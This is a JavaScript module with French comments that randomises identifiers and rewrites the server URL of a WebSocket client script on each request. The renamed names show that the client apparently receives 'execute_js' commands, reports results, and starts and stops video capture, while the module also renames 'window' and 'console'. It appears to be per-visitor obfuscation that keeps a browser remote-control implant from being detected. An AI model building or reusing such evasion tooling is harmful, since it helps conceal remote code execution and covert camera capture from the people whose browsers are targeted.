/**
 * Générateur de noms de variables aléatoires pour l'obfuscation
 */
class VariableRandomizer {
  /**
   * Génère une chaîne aléatoire
   * @param {number} minLength - Longueur minimale
   * @param {number} maxLength - Longueur maximale
   * @returns {string} Chaîne aléatoire
   */
  static generateRandomString(minLength = 8, maxLength = 15) {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    const numbers = '0123456789';
    let result = '';

    // Commence toujours par une lettre
    result += chars.charAt(Math.floor(Math.random() * chars.length));

    // Ajoute des caractères aléatoires
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    for (let i = 1; i < length; i++) {
      const allChars = chars + numbers;
      result += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }

    return result;
  }

  /**
   * Génère un mapping complet de noms de variables randomisés
   * @returns {Object} Mapping oldName -> newName
   */
  static generateMapping() {
    return {
      // Noms de classes
      ClientNet3m8w: this.generateRandomString(),

      // Propriétés de la classe
      urlServer9k2v: this.generateRandomString(),
      socketConn7x1q: this.generateRandomString(),
      userIdent4z8n: this.generateRandomString(),
      retryCount5p3j: this.generateRandomString(),
      maxRetries6h9l: this.generateRandomString(),
      pingTimer8w4r: this.generateRandomString(),
      streamVideo2y7s: this.generateRandomString(),
      intervalVideo9n5t: this.generateRandomString(),

      // Méthodes de la classe
      connect: this.generateRandomString(),
      sendMessage: this.generateRandomString(),
      startPing: this.generateRandomString(),
      stopPing: this.generateRandomString(),
      attemptReconnect: this.generateRandomString(),
      disconnect: this.generateRandomString(),
      startVideoCapture: this.generateRandomString(),
      stopVideoCapture: this.generateRandomString(),

      // Variables globales
      URL_CONFIG_Q4R7: this.generateRandomString(),
      clientInstance5x3m: this.generateRandomString(),

      // Variables locales
      message: this.generateRandomString(),
      event: this.generateRandomString(),
      result: this.generateRandomString(),
      executeError: this.generateRandomString(),
      error: this.generateRandomString(),
      delay: this.generateRandomString(),

      // Propriétés des messages WebSocket
      type: this.generateRandomString(),
      welcome: this.generateRandomString(),
      uuid: this.generateRandomString(),
      execute_js: this.generateRandomString(),
      code: this.generateRandomString(),
      success: this.generateRandomString(),
      timestamp: this.generateRandomString(),
      js_executed: this.generateRandomString(),
      start_video: this.generateRandomString(),
      stop_video: this.generateRandomString(),
      ping: this.generateRandomString(),

      // Méthodes WebSocket
      onopen: this.generateRandomString(),
      onmessage: this.generateRandomString(),
      onclose: this.generateRandomString(),
      onerror: this.generateRandomString(),
      readyState: this.generateRandomString(),

      // Objets globaux
      window: this.generateRandomString(),
      console: this.generateRandomString()
    };
  }

  /**
   * Applique la randomisation sur le code
   * @param {string} code - Code source à modifier
   * @param {Object} mapping - Mapping des noms de variables
   * @param {Object} req - Objet de requête pour l'URL dynamique
   * @returns {string} Code modifié
   */
  static applyRandomization(code, mapping, req) {
    let modifiedCode = code;

    // Remplacer l'URL statique par l'URL dynamique
    const protocol = req.headers['x-forwarded-proto'] || 'ws';
    const host = req.headers.host || 'localhost:3000';
    const wsProtocol = protocol === 'https' ? 'wss' : 'ws';
    const dynamicUrl = `${wsProtocol}://${host}:5000`;

    const urlRegex = /"wss:\/\/[^"]+"/g;
    modifiedCode = modifiedCode.replace(urlRegex, `"${dynamicUrl}"`);

    // Appliquer le mapping des variables
    for (const [oldName, newName] of Object.entries(mapping)) {
      const regex = new RegExp(`\\b${oldName}\\b`, 'g');
      modifiedCode = modifiedCode.replace(regex, newName);
    }

    return modifiedCode;
  }
}

module.exports = VariableRandomizer;